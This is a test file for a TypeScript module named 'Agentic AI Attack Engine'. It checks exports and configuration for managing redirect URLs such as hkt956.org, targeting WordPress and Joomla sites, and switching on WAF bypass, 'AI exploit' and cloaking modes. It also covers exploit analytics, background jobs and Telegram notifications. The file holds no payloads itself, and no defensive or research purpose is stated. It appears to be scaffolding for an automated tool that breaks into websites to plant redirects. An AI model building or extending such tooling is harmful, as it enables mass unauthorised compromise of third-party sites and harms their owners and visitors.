/**
 * Tests for Agentic AI Attack Engine
 */
import { describe, it, expect, vi } from "vitest";

// ─── Module Exports ───
describe("Agentic Attack Engine - Exports", () => {
  it("should export all required functions", async () => {
    const mod = await import("./agentic-attack-engine");
    expect(typeof mod.getRedirectUrls).toBe("function");
    expect(typeof mod.pickRedirectUrl).toBe("function");
    expect(typeof mod.updateRedirectStats).toBe("function");
    expect(typeof mod.addRedirectUrl).toBe("function");
    expect(typeof mod.removeRedirectUrl).toBe("function");
    expect(typeof mod.listRedirectUrls).toBe("function");
    expect(typeof mod.updateRedirectUrl).toBe("function");
    expect(typeof mod.startAgenticSession).toBe("function");
    expect(typeof mod.stopAgenticSession).toBe("function");
    expect(typeof mod.getAgenticSessionStatus).toBe("function");
    expect(typeof mod.listAgenticSessions).toBe("function");
    expect(typeof mod.getActiveSessionCount).toBe("function");
    expect(typeof mod.seedDefaultRedirectUrl).toBe("function");
  });

  it("should export AgenticConfig and AgenticEvent types", async () => {
    // TypeScript type check - if this compiles, types are exported correctly
    const mod = await import("./agentic-attack-engine");
    const config: import("./agentic-attack-engine").AgenticConfig = {
      userId: 1,
      mode: "full_auto",
      redirectUrls: ["https://hkt956.org/"],
      maxTargetsPerRun: 10,
      maxConcurrent: 2,
    };
    expect(config.mode).toBe("full_auto");
    expect(config.redirectUrls).toContain("https://hkt956.org/");
  });
});

// ─── Redirect URL Management ───
describe("Agentic Attack Engine - Redirect URL Logic", () => {
  it("pickRedirectUrl should return a URL from the provided list", async () => {
    const { pickRedirectUrl } = await import("./agentic-attack-engine");
    const urls = ["https://hkt956.org/", "https://example.com/", "https://test.org/"];
    const result = await pickRedirectUrl(urls);
    expect(urls).toContain(result);
  });

  it("pickRedirectUrl should handle single URL", async () => {
    const { pickRedirectUrl } = await import("./agentic-attack-engine");
    const result = await pickRedirectUrl(["https://hkt956.org/"]);
    expect(result).toBe("https://hkt956.org/");
  });

  it("getActiveSessionCount should return a number", async () => {
    const { getActiveSessionCount } = await import("./agentic-attack-engine");
    const count = getActiveSessionCount();
    expect(typeof count).toBe("number");
    expect(count).toBeGreaterThanOrEqual(0);
  });
});

// ─── Session Config Validation ───
describe("Agentic Attack Engine - Config Validation", () => {
  it("should accept all three modes", async () => {
    const mod = await import("./agentic-attack-engine");
    const modes: Array<import("./agentic-attack-engine").AgenticConfig["mode"]> = [
      "full_auto", "semi_auto", "discovery_only"
    ];
    for (const mode of modes) {
      const config: import("./agentic-attack-engine").AgenticConfig = {
        userId: 1,
        mode,
      };
      expect(config.mode).toBe(mode);
    }
  });

  it("config should have correct default-like values", async () => {
    const config: import("./agentic-attack-engine").AgenticConfig = {
      userId: 1,
      mode: "full_auto",
      targetCms: ["wordpress", "joomla"],
      maxTargetsPerRun: 50,
      maxConcurrent: 3,
      enableWafBypass: true,
      enableAiExploit: true,
      enableCloaking: false,
    };
    expect(config.maxTargetsPerRun).toBe(50);
    expect(config.maxConcurrent).toBe(3);
    expect(config.enableWafBypass).toBe(true);
    expect(config.enableAiExploit).toBe(true);
    expect(config.enableCloaking).toBe(false);
    expect(config.targetCms).toEqual(["wordpress", "joomla"]);
  });
});

// ─── Agentic Attack Router ───
describe("Agentic Attack Router - Exports", () => {
  it("should export the agenticAttackRouter", async () => {
    const mod = await import("./routers/agentic-attack");
    expect(mod.agenticAttackRouter).toBeDefined();
  });
});

// ─── Exploit Analytics Router ───
describe("Exploit Analytics Router - Exports", () => {
  it("should export all exploit analytics procedures", async () => {
    const mod = await import("./routers/exploit-analytics");
    expect(mod.recordExploit).toBeDefined();
    expect(mod.recordWafDetection).toBeDefined();
    expect(mod.getExploitAnalytics).toBeDefined();
    expect(mod.getExploitHistory).toBeDefined();
    expect(mod.getWafHistory).toBeDefined();
    expect(mod.getAiVsTemplateComparison).toBeDefined();
  });
});

// ─── Job Runner Integration ───
describe("Agentic Attack Engine - Job Runner Integration", () => {
  it("should import job-runner functions correctly", async () => {
    const jobRunner = await import("./job-runner");
    expect(typeof jobRunner.startBackgroundJob).toBe("function");
    expect(typeof jobRunner.getJobStatus).toBe("function");
  });
});

// ─── Telegram Notifier Integration ───
describe("Agentic Attack Engine - Telegram Integration", () => {
  it("should import telegram-notifier correctly", async () => {
    const telegram = await import("./telegram-notifier");
    expect(typeof telegram.sendTelegramNotification).toBe("function");
  });
});
